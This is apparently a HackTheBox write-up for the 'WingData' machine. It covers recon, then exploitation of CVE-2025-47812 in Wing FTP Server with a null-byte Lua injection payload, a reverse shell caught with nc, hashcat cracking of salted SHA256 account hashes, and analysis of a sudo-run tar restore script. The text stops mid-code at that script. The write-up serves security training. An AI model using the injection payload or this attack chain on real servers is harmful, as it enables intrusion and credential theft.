[HTB: WingData](/2026/06/27/htb-wingdata.html)

![WingData](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-cover.webp)

WingData runs a Wing FTP Server instance with anonymous access enabled. I’ll abuse a null-byte injection flaw in the web interface that smuggles Lua code into the session file, giving remote code execution and a shell. From there, I’ll find Wing FTP’s account files holding salted password hashes, crack one, and reuse it to move to the next user. That user can run a Python backup-restore script as root that unpacks tar archives using the tarfile module’s “data” extraction filter. I’ll exploit a path-validation bypass in that filter to write outside the extraction directory and drop a key into the root account for full access.

## Box Info

[![WingData](/icons/box-wingdata.webp)](https://hackthebox.com/machines/wingdata)

[WingData](https://hackthebox.com/machines/wingdata)

Easy

Retire Date 27 Jun 2026

OS ![Linux](/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for WingData](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-diff.webp)

Radar Graph ![Radar chart for WingData](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-radar.webp)

User

00:07:18 Root

00:20:01 Creator ## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.244.106
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 19:20 UTC
Nmap scan report for 10.129.244.106
Host is up, received echo-reply ttl 63 (0.019s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
oxdf@hacky$ sudo nmap -p 22,80 -sCV 10.129.244.106
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 19:20 UTC
Nmap scan report for 10.129.244.106
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
```

Based on the [OpenSSH version](about:/cheatsheets/os#debian) versions, the host is likely running Debian 12 Bookworm.

Both of the ports show a TTL of 63, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Linux one hop away.

### Subdomain Fuzz

`nmap` shows a redirect to `wingdata.htb` on port 80. I’ll use `ffuf` to bruteforce for subdomains that respond differently:

```
oxdf@hacky$ ffuf -u http://10.129.244.106 -H "Host: FUZZ.wingdata.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.244.106
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.wingdata.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 52ms]
:: Progress: [19966/19966] :: Job [1/1] :: 2061 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

It finds `ftp.wingdata.htb`. I’ll add both to my local `hosts` file:

```
10.129.244.106 wingdata.htb ftp.wingdata.htb
```

I’ll rescan each domain with `nmap` using scripts, but not find anything important.

### wingdata.htb - TCP 80

#### Site

The site is for a file sharing product:

 ![image-20260618090404914](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618090404914.webp)![expand](/icons/expand.png)

It offers “AES-256 encryption and recipient authentication”. There’s a contact form at the bottom, but it just sends an HTTP POST with the data to `/`, and there’s no indications it’s actually hooked into anything.

All of the links lead to anchor points on the page, except “Client Portal”, which leads to `ftp.wingdata.htb`.

#### Tech Stack

The HTTP response headers show boring Apache response:

```
HTTP/1.1 200 OK
Date: Thu, 18 Jun 2026 13:03:31 GMT
Server: Apache/2.4.66 (Debian)
Last-Modified: Sun, 02 Nov 2025 22:38:13 GMT
ETag: "30cc-642a4410baebe-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 12492
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```

The main page loads as `index.html`, suggesting a static site. The 404 page is the default Apache 404:

![image-20260618091244839](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618091244839.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since I know the site has raw HTML pages:

```
oxdf@hacky$ feroxbuster -u http://wingdata.htb -x html
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  \`    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://wingdata.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       29w      317c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w      314c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      151l      333w     3905c http://wingdata.htb/assets/js/templatemo-custom.js
200      GET      251l     1069w    12492c http://wingdata.htb/index.html
200      GET      193l      571w     5974c http://wingdata.htb/assets/js/animation.js
200      GET      186l      505w     4928c http://wingdata.htb/assets/css/owl.css
200      GET       44l      333w    19982c http://wingdata.htb/assets/images/contact-decoration.png
301      GET        9l       29w      353c http://wingdata.htb/assets => http://wingdata.htb/assets/
200      GET      149l      837w    67141c http://wingdata.htb/assets/images/about-left-image.png
200      GET      496l     1721w    13281c http://wingdata.htb/assets/js/imagesloaded.js
200      GET     1577l     3269w    31620c http://wingdata.htb/assets/css/templatemo-space-dynamic.css
200      GET        4l       64w    23742c http://wingdata.htb/assets/css/fontawesome.css
200      GET        7l     1002w    80223c http://wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET     3158l     6952w    76080c http://wingdata.htb/assets/css/animated.css
200      GET     3448l    10094w    93438c http://wingdata.htb/assets/js/owl-carousel.js
200      GET        2l     1283w    86927c http://wingdata.htb/vendor/jquery/jquery.min.js
301      GET        9l       29w      356c http://wingdata.htb/assets/js => http://wingdata.htb/assets/js/
301      GET        9l       29w      357c http://wingdata.htb/assets/css => http://wingdata.htb/assets/css/
301      GET        9l       29w      360c http://wingdata.htb/assets/images => http://wingdata.htb/assets/images/
200      GET      329l     1996w   148839c http://wingdata.htb/assets/images/banner-right-image.png
200      GET    10724l    20204w   204037c http://wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
200      GET      251l     1069w    12492c http://wingdata.htb/
301      GET        9l       29w      359c http://wingdata.htb/assets/fonts => http://wingdata.htb/assets/fonts/
301      GET        9l       29w      353c http://wingdata.htb/vendor => http://wingdata.htb/vendor/
301      GET        9l       29w      360c http://wingdata.htb/vendor/jquery => http://wingdata.htb/vendor/jquery/
[####################] - 2m    240045/240045  0s      found:23      errors:51137  
[####################] - 2m     30000/30000   252/s   http://wingdata.htb/ 
[####################] - 2m     30000/30000   249/s   http://wingdata.htb/assets/ 
[####################] - 2m     30000/30000   250/s   http://wingdata.htb/assets/js/ 
[####################] - 2m     30000/30000   249/s   http://wingdata.htb/assets/css/ 
[####################] - 2m     30000/30000   248/s   http://wingdata.htb/assets/images/ 
[####################] - 2m     30000/30000   249/s   http://wingdata.htb/assets/fonts/ 
[####################] - 2m     30000/30000   250/s   http://wingdata.htb/vendor/ 
[####################] - 2m     30000/30000   248/s   http://wingdata.htb/vendor/jquery/
```

Nothing interesting.

### ftp.wingdata.htb - TCP 80

#### Site

The site is an instance of [Wing FTP](https://www.wftpserver.com/):

![image-20260618092436946](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618092436946.webp)

Not much I can do here without creds, but the standard anonymous FTP login (username “anonymous” with an empty password) does work to login:

![image-20260618100210361](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618100210361.webp)

That’s the [default behavior](https://www.invicti.com/web-application-vulnerabilities/wing-ftp-anonymous-access) in Wing FTP.

#### Tech Stack

The HTTP headers show the server as Wing FTP Server (Free Edition):

```
HTTP/1.1 200 HTTP OK
Date: Thu, 18 Jun 2026 13:18:33 GMT
Server: Wing FTP Server(Free Edition)
Cache-Control: no-store
Content-Type: text/html
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Length: 678
```

The version is given in the site footer as v7.4.3.

The 404 returns with no body, just headers:

```
HTTP/1.1 404 Not found
Date: Thu, 18 Jun 2026 13:34:02 GMT
Server: Wing FTP Server(Free Edition)
Content-Type: application/octet-stream
Content-Length: 0
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
```

This shows up in Firefox with their 404 page:

![image-20260618093441855](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618093441855.webp)

I’ll skip the directory brute force on known software.

## Shell as wingftp

### CVE Identification

Searching for “Wingftp v7.4.3 exploit” returns a lot of references to CVE-2025-47812:

![image-20260618094703278](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618094703278.webp)

### CVE-2025-47812 Background

[CVE-2025-47812](https://nvd.nist.gov/vuln/detail/CVE-2025-47812) is a remote code execution vulnerability in Wing FTP server before 7.4.4:

> In Wing FTP Server before 7.4.4. the user and admin web interfaces mishandle ‘\\0’ bytes, ultimately allowing injection of arbitrary Lua code into user session files. This can be used to execute arbitrary system commands with the privileges of the FTP service (root or SYSTEM by default). This is thus a remote code execution vulnerability that guarantees a total server compromise. This is also exploitable via anonymous FTP accounts.

It mishandles null bytes allowing for arbitrary Lua code to be executed. This vulnerability got the rare 10.0 base score in CVSS. There were a lot of cybercrime actors using this vulnerability when it first became public in July 2025, and it was eventually added to the [CISA KEV list](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-47812). RCE Security did a [detailed writeup](https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/) on the vulnerability. All the writeups say that Wing FTP runs as root, so that should be interesting as well.

When a user logs in, it creates a session file for that login named `<cookie value>.lua` that looks like this:

```lua
_SESSION['username']=[[<username>]]
_SESSION['ipaddress']=[[192.168.1.100]]
_SESSION['currentpath']=[[/]]
```

When the user loads a page using that cookie, this Lua is run.

Wings FTP didn’t handle the null byte in the username correctly. On the name check, it only checks up to the null byte. But the full string is written to the config file, allowing an attacker to craft a malicious login that injects code into the session file.

### POC

I need a valid username, but luckily for me, anonymous with a blank password will work here. I’ll create a payload that looks like:

```lua
anonymous\0]]
local h = io.popen("id")
local r = h:read("*a")
h:close()
print(r)
--
```

The username check will only check up until the null byte, seeing the username anonymous. When that writes to the session file, it will become:

```lua
_SESSION['username']=[[anonymous\0]]
local h = io.popen("id")
local r = h:read("*a")
h:close()
print(r)
--]]
_SESSION['ipaddress']=[[10.10.14.51]]
_SESSION['currentpath']=[[/]]
```

The `--` comments out the trailing `]]`. I’ll URL-encode this, and send it via Burp Repeater:

![image-20260618121923335](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618121923335.webp)

Then I’ll load `/dir.html` (which I can see in Burp Proxy is the page loaded on login) with that cookie:

![image-20260618122013716](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618122013716.webp)

At the top of the page, there’s the output of the `id` command. Interestingly, Wing FTP is not running as root. That’s likely an adjustment made for the HTB gameplay.

### Shell

I’ll simply update the command in Burp Repeater by replacing `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20260618124003645](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618124003645.webp)

It returns a new cookie, which I’ll place in the other Repeater tab to trigger:

![image-20260618124030910](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618124030910.webp)

It just hangs, but at my `nc` there’s a reverse shell:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.244.106 48212
bash: cannot set terminal process group (3560): Inappropriate ioctl for device
bash: no job control in this shell
wingftp@wingdata:/opt/wftpserver$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
wingftp@wingdata:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
wingftp@wingdata:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
wingftp@wingdata:/$
```

## Shell as wacky

### Enumeration

#### Users

The wingftp user’s home directory is `/opt/wingftp`. In `/home`, there’s one home directory:

```
wingftp@wingdata:/home$ ls
wacky
```

wingftp can’t access it. wingftp, wacky, and root are the only users with shells set in `passwd`:

```
wingftp@wingdata:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

It’s a bit weird that wingftp has a shell.

#### WingFTP

There’s nothing particularly interesting on the filesystem, other than in `/opt`:

```
wingftp@wingdata:/opt$ ls -l
total 8
drwxr-x--- 4 root    wacky   4096 Jan 12 08:43 backup_clients
drwxr-x--- 9 wingftp wingftp 4096 Jun 18 08:17 wftpserver
```

I don’t have access to `backup_clients` (I’ll have to come back as wacky), and `wftpserver` is the installation directory for WingFTP (and the wingftp user’s home directory):

```
wingftp@wingdata:/opt/wftpserver$ ls
Data         pid-wftpserver.pid  version.txt  wftp_default_ssh.key
License.txt  README              webadmin     wftp_default_ssl.crt
Log          session             webclient    wftp_default_ssl.key
lua          session_admin       wftpconsole  wftpserver
```

WingFTP uses a file-based storage system instead of a database, which is in the `Data` directory. `_ADMINISTRATOR` has a file with config data on the admin users:

```
wingftp@wingdata:/opt/wftpserver/Data$ ls _ADMINISTRATOR/
admins.xml    settings.xml
```

`admins.xml` has a password hash:

```xml
<?xml version="1.0" ?>
<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
    <ADMIN>
        <Admin_Name>admin</Admin_Name>
        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
        <Type>0</Type>
        <Readonly>0</Readonly>
        <IsDomainAdmin>0</IsDomainAdmin>
        <DomainList></DomainList>
        <MyDirectory></MyDirectory>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
    </ADMIN>
</ADMIN_ACCOUNTS>
```

Similarly, the `1` directory has user information:

```
wingftp@wingdata:/opt/wftpserver/Data$ ls 1 
groups  portlistener.xml  settings.xml  users
wingftp@wingdata:/opt/wftpserver/Data$ ls 1/users/
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

The user files are longer, but have the same `Password` field:

```xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```

I’ll pull all the passwords, as well as any salt settings:

```
wingftp@wingdata:/opt/wftpserver/Data$ find . -name '*.xml' | xargs grep -i -e salt -e password   
./_ADMINISTRATOR/admins.xml:        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
./1/users/maria.xml:        <EnablePassword>1</EnablePassword>
./1/users/maria.xml:        <Password>a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03</Password>
./1/users/maria.xml:        <PasswordLength>0</PasswordLength>
./1/users/maria.xml:        <CanChangePassword>0</CanChangePassword>
./1/users/steve.xml:        <EnablePassword>1</EnablePassword>
./1/users/steve.xml:        <Password>5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca</Password>
./1/users/steve.xml:        <PasswordLength>0</PasswordLength>
./1/users/steve.xml:        <CanChangePassword>0</CanChangePassword>
./1/users/wacky.xml:        <EnablePassword>1</EnablePassword>
./1/users/wacky.xml:        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
./1/users/wacky.xml:        <PasswordLength>0</PasswordLength>
./1/users/wacky.xml:        <CanChangePassword>0</CanChangePassword>
./1/users/anonymous.xml:        <EnablePassword>0</EnablePassword>
./1/users/anonymous.xml:        <Password>d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca</Password>
./1/users/anonymous.xml:        <PasswordLength>0</PasswordLength>
./1/users/anonymous.xml:        <CanChangePassword>0</CanChangePassword>
./1/users/john.xml:        <EnablePassword>1</EnablePassword>
./1/users/john.xml:        <Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10</Password>
./1/users/john.xml:        <PasswordLength>0</PasswordLength>
./1/users/john.xml:        <CanChangePassword>0</CanChangePassword>
./1/settings.xml:    <MYSQL_Password></MYSQL_Password>
./1/settings.xml:    <ODBC_DSN_Password></ODBC_DSN_Password>
./1/settings.xml:    <Min_Password_Length>0</Min_Password_Length>
./1/settings.xml:    <Password_Have_Numerals>0</Password_Have_Numerals>
./1/settings.xml:    <Password_Have_Lowercase>0</Password_Have_Lowercase>
./1/settings.xml:    <Password_Have_Uppercase>0</Password_Have_Uppercase>
./1/settings.xml:    <Password_Have_Nonalphanumeric>0</Password_Have_Nonalphanumeric>
./1/settings.xml:    <Change_Password_Firstlogon>0</Change_Password_Firstlogon>
./1/settings.xml:    <EnablePasswordSalting>1</EnablePasswordSalting>
./1/settings.xml:    <SaltingString>WingFTP</SaltingString>
./settings.xml:    <ServerPassword>2D35A8D420A697203D7C554A678F8119</ServerPassword>
```

### Recover Password

#### Format Data

A little Bash foo makes a nicely formatted set of passwords:

```
wingftp@wingdata:/opt/wftpserver/Data$ grep -r "<Password>" . | sed -E 's#.*/([^/]+)\.xml:.*<[^>]+>([0-9a-fA-F]+)</[^>]+>.*#\1:\2#'
admins:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
anonymous:d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
```

Looking at the length of each password, they are each 64 hex characters, which means they are likely SHA256. In fact, the settings file in the `1` directory specifies that:

```
wingftp@wingdata:/opt/wftpserver/Data$ cat 1/settings.xml | grep SHA
    <EnableSHA256>1</EnableSHA256>
```

This is also in the [WingFTP documentation](https://www.wftpserver.com/help/ftpserver/index.html?compression.htm). When that option is disabled it will use MD5.

The output above also showed that there is a salt of “WingFTP”. Another [documentation page](https://www.wftpserver.com/help/ftpserver/index.html?user__group.htm) shows that the passwords are stored as “SHA256(Password+SaltString)”.

Hashcat has in it’s [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) page mode 1410:

```
1410    sha256($pass.$salt)    c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4:53743528
```

A slight update to the `sed` command above gets:

```
wingftp@wingdata:/opt/wftpserver/Data$ grep -r "<Password>" . | sed -E 's#.*/([^/]+)\.xml:.*<[^>]+>([0-9a-fA-F]+)</[^>]+>.*#\1:\2:WingFTP#' | tee wingftp.hashes
admins:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP
maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
anonymous:d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP
john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
```

I’ll save those to a file.

#### Crack

I’ll run these hashes through `hashcat`:

```
$ hashcat -m 1410 --user wingftp.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting
...[snip]...
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP:
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
...[snip]...
```

It cracks both anonymous (empty password) and wacky.

### su / SSH

The password works for the wacky user both with `su`:

```
wingftp@wingdata:/$ su - wacky
Password: 
wacky@wingdata:~$
```

And over SSH:

```
oxdf@hacky$ sshpass -p '!#7Blushing^*Bride5' ssh wacky@wingdata.htb
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
...[snip]...
wacky@wingdata:~$
```

## Shell as root

### Enumeration

#### sudo

I already noted that wacky had access to `/opt/backup_clients` whereas wingftp didn’t. It turns out there’s a Python script in there that wacky can run as root without a password using `sudo`:

```
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The `/opt/backup_clients` directory has that Python script plus two empty directories:

```
wacky@wingdata:/opt/backup_clients$ ls
backups  restore_backup_clients.py  restored_backups
```

I can run it to see what happens:

```
wacky@wingdata:/opt/backup_clients$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -h
usage: restore_backup_clients.py [-h] -b BACKUP -r RESTORE_DIR

Restore client configuration from a validated backup tarball.

options:
  -h, --help            show this help message and exit
  -b BACKUP, --backup BACKUP
                        Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, where <client_id> is a positive integer,
                        e.g., backup_1001.tar)
  -r RESTORE_DIR, --restore-dir RESTORE_DIR
                        Staging directory name for the restore operation. Must follow the format: restore_<client_user> (e.g., restore_john). Only
                        alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters).

Example: sudo restore_backup_clients.py -b backup_1001.tar -r restore_john
```

#### Source Analysis

The script has the following structure:

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    ...[snip]...

if __name__ == "__main__":
    main()
```

`validate_backup_name` makes sure that the filename is `backup_<digits>.tar` with nothing else. `<digits>` has to be only digits.

`validate_restore_tag` requires that the tag is between 1 and 24 letters, numbers, and underscore.

The start of `main` is all parsing and validating arguments:

```python
def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)
```

The user can control the backup directory and the restore directory, with the constraints discussed above. It’s using `os.path.join`, which is typically a target for directory traversals. Because the `backup` filename is so restricted, I don’t see a way to abuse that.

The restore directory is checked that it starts with “restore\_” and after that is a valid “tag”, containing only letters, numbers, and underscore. This makes path attacks impractical.

Then it builds the restore directory path and decompresses into that path:

```python
staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
print(f"[+] Backup: {args.backup}")
print(f"[+] Staging directory: {staging_dir}")

os.makedirs(staging_dir, exist_ok=True)

try:
    with tarfile.open(backup_path, "r") as tar:
